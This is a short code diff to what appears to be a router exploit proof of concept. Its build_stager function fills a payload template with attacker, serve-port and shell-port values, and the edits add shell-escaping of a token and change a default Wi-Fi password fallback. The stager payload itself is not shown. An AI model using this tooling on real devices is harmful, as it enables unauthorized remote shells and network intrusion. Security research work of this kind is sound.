@@ -153,7 +153,7 @@ def build_stager(attacker, serve_port, shell_port, restore, token,
     enc5, key5 = band(1)
     return STAGER.format(
         attacker=attacker, serve_port=serve_port, shell_port=shell_port,
-        token=token,
+        token=_sh(token),
         enc24=enc24, key24=key24, enc5=enc5, key5=key5,
         repair_iters=repair_iters, repair_interval=repair_interval,
     ).encode()
@@ -166,7 +166,9 @@ def expected_wifi(restore):
     for i, name in ((0, "2.4G"), (1, "5G")):
         b = restore[i] if len(restore) > i else {}
         enc = (b.get("encryption") or "none").strip()
-        key = (b.get("password") or "").strip() or "meshpoc12345"
+        key = b.get("password") or ""
+        if not key.strip():
+            key = "meshpoc12345"
         out.append((name, b.get("ssid", "?"),
                     "open" if enc in ("", "none", "None") else f"{enc} key={key}"))
     return out
